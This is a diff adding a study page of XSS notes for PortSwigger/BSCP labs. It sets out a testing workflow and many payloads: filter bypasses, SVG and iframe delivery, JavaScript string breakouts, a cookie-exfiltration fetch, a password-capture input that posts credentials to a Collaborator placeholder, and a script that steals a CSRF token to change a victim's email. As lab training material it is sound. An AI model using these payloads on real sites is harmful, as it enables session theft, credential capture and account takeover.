@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BSCP XSS · Notes</title>
+<style>
+:root{color-scheme:dark;--bg:#11111b;--panel:#181825;--surface:#1e1e2e;--text:#cdd6f4;--muted:#a6adc8;--blue:#89b4fa;--green:#a6e3a1;--border:#313244;--red:#f38ba8}*{box-sizing:border-box}html{scroll-behavior:smooth;scroll-padding-top:24px}body{margin:0;background:var(--bg);color:var(--text);font:16px/1.65 system-ui,sans-serif}main{max-width:1280px;margin:auto;padding:34px 28px 80px}a{color:var(--blue)}.top{display:flex;justify-content:space-between;align-items:center;gap:18px;margin-bottom:28px}.top h1{margin:0;font-size:clamp(2rem,4vw,2.8rem)}.button{display:inline-block;padding:9px 13px;border:1px solid var(--border);border-radius:9px;background:var(--surface);text-decoration:none}.lead{max-width:950px;color:var(--muted);font-size:1.08rem;margin:0 0 28px}.warning{padding:16px 18px;border:1px solid #f38ba855;border-left:4px solid var(--red);border-radius:10px;background:#f38ba80b;margin:22px 0 32px}.layout{display:grid;grid-template-columns:245px minmax(0,1fr);gap:26px;align-items:start}.toc{position:sticky;top:18px;padding:18px;background:var(--panel);border:1px solid var(--border);border-radius:14px}.toc h2{font-size:1rem;margin:0 0 10px}.toc a{display:block;padding:5px 0;color:var(--muted);text-decoration:none;font-size:.92rem}.toc a:hover{color:var(--blue)}.content section{margin:0 0 24px;padding:25px;background:var(--panel);border:1px solid var(--border);border-radius:15px}.content h2{margin:0 0 12px;font-size:1.45rem}.content h3{margin:24px 0 6px;font-size:1.05rem}.content p,.content li{color:var(--muted)}.content ul,.content ol{padding-left:23px}.content li{margin:5px 0}pre{padding:15px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere;background:var(--surface);border:1px solid var(--border);border-radius:10px;color:#cdd6f4;font: .91rem/1.6 ui-monospace,SFMono-Regular,Consolas,monospace}code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;color:#f9e2af}.pill{display:inline-block;color:var(--green);background:var(--surface);border:1px solid var(--border);border-radius:99px;padding:2px 9px;font-size:.78rem;margin-left:6px}details{margin-top:12px}summary{cursor:pointer;color:var(--blue);font-weight:700}.small{font-size:.9rem}@media(max-width:800px){.layout{grid-template-columns:1fr}.toc{position:static}.toc nav{columns:2}}@media(max-width:520px){main{padding:22px 15px 55px}.top{align-items:flex-start;flex-direction:column}.content section{padding:19px}.toc nav{columns:1}}
+</style>
+</head>
+<body><main>
+<header class="top"><h1>BSCP XSS Notes</h1><a class="button" href="/">← Back to exercises</a></header>
+<p class="lead">A practical reference for tracing input, identifying the browser parsing context, testing filter behavior, and adapting a proof of execution to an authorized lab objective.</p>
+<div class="warning"><strong>Authorized labs only.</strong> The examples below are for PortSwigger labs or the local training app. Replace lab and Collaborator placeholders with infrastructure you control. Do not collect real users’ cookies, passwords, or other data. The local demo bot is restricted to the local training origin.</div>
+<div class="layout">
+<aside class="toc"><h2>On this page</h2><nav>
+<a href="#workflow">Workflow</a><a href="#custom-tags">Custom tags</a><a href="#blocked-tags">Most tags blocked</a><a href="#href-events">Event handlers and href</a><a href="#svg">SVG allowed</a><a href="#encoding">Encoding and JavaScript contexts</a><a href="#jquery">jQuery location.hash</a><a href="#postmessage">Web messages</a><a href="#dom-sinks">DOM sinks</a><a href="#cookie">Cookie access</a><a href="#passwords">Password capture lab</a><a href="#csrf">XSS to perform CSRF</a><a href="#bypasses">Payload encoding</a><a href="#cheatsheet">Cheat sheet</a>
+</nav></aside>
+<div class="content">
+<section id="workflow"><h2>Workflow notes</h2>
+<h3>Search bar</h3><ol><li>Submit a unique marker, such as <code>MARKER731</code>, and locate it in the request, response, and live DOM.</li><li>Trace the value to its sink. Decide whether it is reflected by the server or inserted by client-side JavaScript.</li><li>Identify the exact context: HTML text, attribute, JavaScript string, URL, or DOM API.</li><li>Change one delimiter at a time; compare what you sent with the response and DOM to map encoding, escaping, and filtering.</li><li>Prove execution with a harmless effect before adapting the payload to the authorized lab objective.</li></ol>
+<h3>Comment section</h3><ol><li>Check whether comments are stored, moderated, or reflected only in the immediate response.</li><li>Submit a harmless marker and inspect how it is rendered on a fresh page load and, where relevant, in another user’s view.</li><li>Map server-side cleanup and client-side transformations separately. A stored value may reach different sinks in different views.</li><li>In the local exercise, submit the payload first, then send the stored-comments page to the local bot.</li></ol>
+<h3>Cookie: HttpOnly not set</h3><p>If a session cookie is not marked <code>HttpOnly</code>, JavaScript running in that origin can usually read it through <code>document.cookie</code>. That makes direct cookie access possible, but whether it is the right objective depends on the lab. Cookies marked <code>HttpOnly</code> are omitted from <code>document.cookie</code>; XSS may still be able to perform actions as the user through same-origin requests.</p>
+</section>
+<section id="custom-tags"><h2>Custom tags <span class="pill">focus event</span></h2><p>When standard tags are blocked, check whether a custom element name is accepted. It may need to be made focusable and focused by the victim flow.</p><pre><code>&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x</code></pre><p class="small">The fragment can target the element when the link is opened. Verify whether the page or the lab’s delivery flow actually gives it focus.</p></section>
+<section id="blocked-tags"><h2>With most tags and attributes blocked</h2><ol><li>Identify which tags are allowed. In Repeater, right-click the parameter and choose <strong>Scan insertion point</strong>. Use the scan to identify candidate tags and events.</li><li>Review the scanner result, then verify the surviving attribute or event handler in the response and browser.</li><li>Check whether a different harmless proof such as <code>print()</code> is useful when a lab’s detection or WAF behavior treats dialogs specially.</li></ol><pre><code>&lt;body onresize=print() tabindex=1&gt;</code></pre><p>For a victim-triggered resize in a controlled PortSwigger lab, the exploit page can embed the target in an iframe and resize it after load.</p></section>
+<section id="href-events"><h2>Event handlers and href blocked</h2><p>If direct event handlers and <code>javascript:</code> URLs are filtered, investigate SVG elements that can change an anchor’s <code>href</code> value through animation.</p><pre><code>&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values="javascript:print()" /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;</code></pre><p>Whether this executes may depend on browser behavior and user interaction. Test in the exact lab browser.</p></section>
+<section id="svg"><h2>SVG markup allowed</h2><ol><li>Check which SVG elements survive, for example <code>svg</code>, <code>animateTransform</code>, <code>title</code>, or <code>image</code>.</li><li>Use the insertion-point scanner to find event attributes the filter does not remove.</li><li>Consider events tied to the element lifecycle, such as an animation’s <code>onbegin</code>.</li></ol><pre><code>&lt;svg&gt;&lt;animatetransform attributeName=transform type=translate from="0 0" to="1 1" dur="1s" onbegin=print()&gt;</code></pre></section>
+<section id="encoding"><h2>Encoding and JavaScript contexts</h2>
+<h3>Angle brackets encoded</h3><p>If the value is inside an existing element’s attribute, you may be able to add an event handler by closing the quoted value. First inspect the exact quote style and whether whitespace or the event name is filtered.</p><pre><code>" onmouseover="print()</code></pre>
+<h3>Quotes HTML-encoded in an href</h3><p>When the injected value remains inside an href, test URL schemes only in the authorized lab and check how the browser interprets the final attribute.</p><pre><code>javascript:print()</code></pre>
+<h3>Single quote is backslash-escaped in a JavaScript string</h3><p>Escaping a quote can be bypassable when existing backslashes are not normalized. Compare each transformation carefully; the number of backslashes changes how the JavaScript parser reads the quote.</p><pre><code>&lt;/script&gt;&lt;script&gt;print()&lt;/script&gt;
+
+Input:  ';print(document.domain)//
+After:  \';print(document.domain)//
+Alternative input:  \';print(document.domain)//
+After:  \\';print(document.domain)//</code></pre>
+<h3>Breaking out of a JavaScript string</h3><pre><code>'-print(document.domain)-'
+';print(document.domain)//
+'-print(1)-'
+\'-print(1)//</code></pre>
+<h3>HTML entities in an attribute</h3><p>Entities such as <code>&amp;apos;</code> may be decoded by the HTML parser before the resulting value is interpreted. Check the context and parsing order.</p><pre><code>&amp;apos;-print(1)-&amp;apos;
+http://foo?&amp;apos;-alert(1)-&amp;apos;</code></pre>
+<h3>Template literal with characters Unicode-escaped</h3><pre><code>${print(1)}</code></pre>
+</section>
+<section id="jquery"><h2>jQuery location.hash</h2><p>Trace the URL fragment into the jQuery or DOM operation. Fragments are not sent in the HTTP request, so inspect client-side code and the live DOM.</p><pre><code>Payload:
+#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"
+
+Alternative fragment test:
+#&lt;img src=x onerror=print()&gt;</code></pre><p>For a controlled lab, an exploit page may embed the target in an iframe and adjust the frame URL after load:</p><pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;</code></pre></section>
+<section id="postmessage"><h2>DOM XSS using web messages and a JavaScript URL</h2><p>When a message listener passes attacker-controlled data into a navigation or URL sink, determine whether it validates the scheme and origin.</p><pre><code>window.postMessage('javascript:print()//http:', '*');</code></pre><p>Example delivery pattern for an authorized lab:</p><pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')"&gt;&lt;/iframe&gt;</code></pre><p class="small">A wildcard target origin is shown because it appears in the lab technique; production message handlers should validate the sender origin and message schema.</p></section>
+<section id="dom-sinks"><h2>DOM sinks to recognize</h2><ul><li><code>document.write()</code> and <code>document.writeln()</code></li><li><code>innerHTML</code>, <code>outerHTML</code>, and <code>insertAdjacentHTML()</code></li><li>HTML attribute assignment and event-handler properties</li><li><code>eval()</code>, <code>Function()</code>, and string-based timers</li><li>Navigation or resource sinks such as <code>location</code>, <code>src</code>, and <code>href</code></li><li>Framework-specific expression or template evaluation</li></ul><p>A source is not vulnerable by itself. Confirm that attacker-controlled data reaches a dangerous sink in an executable context without a safe transformation.</p></section>
+<section id="cookie"><h2>Cookie access in an authorized lab</h2><ol><li>Find a vulnerable feature and identify where the victim will view the injected content.</li><li>First prove execution with a harmless action.</li><li>In a PortSwigger lab, send only the lab’s required test cookie to its own exploit server or a Collaborator instance you control.</li><li>For this local demo, use its local <code>/collect</code> receiver and fake training cookie.</li></ol><pre><code>fetch('/collect?c='+encodeURIComponent(document.cookie))</code></pre><p>For a PortSwigger lab, replace the local receiver with the lab’s own exploit server endpoint; do not use real accounts or third-party targets.</p></section>
+<section id="passwords"><h2>Password capture lab</h2><p>Some training labs ask you to demonstrate credential capture using a deliberately vulnerable comment or page. Keep this strictly inside that lab and use only the supplied test account. Do not deploy credential collection against real users.</p><pre><code>&lt;input name=username id=username&gt;
+&lt;input type=password name=password
+  onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+    method:'POST',mode:'no-cors',body:username.value+':'+this.value
+  })"&gt;</code></pre><p>Use a Collaborator hostname generated for your own authorized exercise. The hostname above is a placeholder and does not receive data.</p></section>
+<section id="csrf"><h2>Using XSS to perform a CSRF-protected action</h2><p>Same-origin XSS can often read a CSRF token from the victim’s page and submit a state-changing request in that victim’s session. Use only the designated lab account and endpoint.</p><pre><code>&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get', '/my-account', true);
+req.send();
+function handleResponse() {
+  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+  var changeReq = new XMLHttpRequest();
+  changeReq.open('post', '/my-account/change-email', true);
+  changeReq.send('csrf=' + token + '&amp;email=student@example.invalid');
+}
+&lt;/script&gt;</code></pre></section>
+<section id="bypasses"><h2>Encoding a payload for a filter</h2><p>Base64 can change the characters visible to a naive filter when the page later decodes and evaluates the value. It does not make unsafe evaluation safe; treat this as a lab-specific bypass.</p><pre><code>printf %s "print(document.domain)" | base64
+
+// In the authorized lab, if the relevant sink evaluates the decoded text:
+eval(atob("BASE64-PAYLOAD"))</code></pre></section>
+<section id="cheatsheet"><h2>PortSwigger XSS cheat sheet</h2><p>Use the official <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreferrer">XSS cheat sheet</a> as a source of candidate tags, attributes, and events. Validate candidates against the lab’s actual browser, context, and filtering behavior.</p></section>
+</div></div></main></body></html>
